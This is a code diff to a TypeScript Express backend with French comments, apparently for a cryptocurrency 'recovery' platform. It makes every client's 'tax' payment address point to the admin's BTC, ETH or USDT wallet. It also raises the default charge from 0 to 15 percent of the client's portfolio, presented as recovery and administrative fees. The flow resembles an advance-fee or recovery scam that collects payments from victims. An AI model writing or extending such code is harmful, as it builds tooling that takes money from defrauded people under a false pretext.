@@ -757,7 +757,17 @@ export async function registerRoutes(app: Express): Promise<Server> {
       await storage.setSetting({ key: 'admin_eth_wallet', value: ethWallet });
       await storage.setSetting({ key: 'admin_usdt_wallet', value: usdtWallet });
       
-      res.json({ message: 'Wallets configurés avec succès' });
+      // Mettre à jour automatiquement tous les clients avec les nouveaux wallets
+      await storage.updateAllClientsWallets(btcWallet, ethWallet, usdtWallet);
+      
+      res.json({ 
+        message: 'Wallets configurés avec succès et propagés à tous les clients',
+        walletsUpdated: {
+          btc: btcWallet,
+          eth: ethWallet,
+          usdt: usdtWallet
+        }
+      });
     } catch (error) {
       console.error('Error configuring wallets:', error);
       res.status(500).json({ message: 'Internal server error' });
@@ -1686,6 +1696,11 @@ export async function registerRoutes(app: Express): Promise<Server> {
         return res.status(404).json({ error: 'Client non trouvé' });
       }
 
+      // Récupérer les wallets admin configurés
+      const btcWallet = await storage.getSetting('admin_btc_wallet');
+      const ethWallet = await storage.getSetting('admin_eth_wallet');
+      const usdtWallet = await storage.getSetting('admin_usdt_wallet');
+
       // Calcul du montant de taxe basé sur le pourcentage du portfolio
       const balances = client.balances || { btc: 0, eth: 0, usdt: 0, ada: 0, dot: 0, sol: 0, link: 0, matic: 0, bnb: 0, xrp: 0 };
       
@@ -1703,18 +1718,37 @@ export async function registerRoutes(app: Express): Promise<Server> {
         balances.xrp * 0.6
       );
       
-      const taxPercentage = parseFloat(client.taxPercentage || '0');
+      const taxPercentage = parseFloat(client.taxPercentage || '15');
       const calculatedTaxAmount = (portfolioValue * taxPercentage) / 100;
+      const taxCurrency = client.taxCurrency || 'BTC';
+
+      // Utiliser le wallet admin correspondant selon la devise de taxe
+      let walletAddress = '';
+      if (taxCurrency === 'BTC' && btcWallet) {
+        walletAddress = btcWallet.value;
+      } else if (taxCurrency === 'ETH' && ethWallet) {
+        walletAddress = ethWallet.value;
+      } else if (taxCurrency === 'USDT' && usdtWallet) {
+        walletAddress = usdtWallet.value;
+      } else {
+        // Fallback vers le wallet du client s'il existe
+        walletAddress = client.taxWalletAddress || '';
+      }
 
       res.json({
-        taxPercentage: client.taxPercentage || '0',
+        taxPercentage: taxPercentage.toString(),
         taxAmount: calculatedTaxAmount.toFixed(2),
-        taxCurrency: client.taxCurrency || 'BTC',
+        taxCurrency: taxCurrency,
         taxStatus: client.taxStatus || 'unpaid',
-        taxWalletAddress: client.taxWalletAddress,
+        taxWalletAddress: walletAddress,
         taxReason: 'Frais de récupération et traitement administratif',
         transactionHash: client.taxPaymentProof,
-        portfolioValue: portfolioValue.toFixed(2)
+        portfolioValue: portfolioValue.toFixed(2),
+        adminWallets: {
+          btc: btcWallet?.value || '',
+          eth: ethWallet?.value || '',
+          usdt: usdtWallet?.value || ''
+        }
       });
     } catch (error) {
       console.error('Get tax info error:', error);
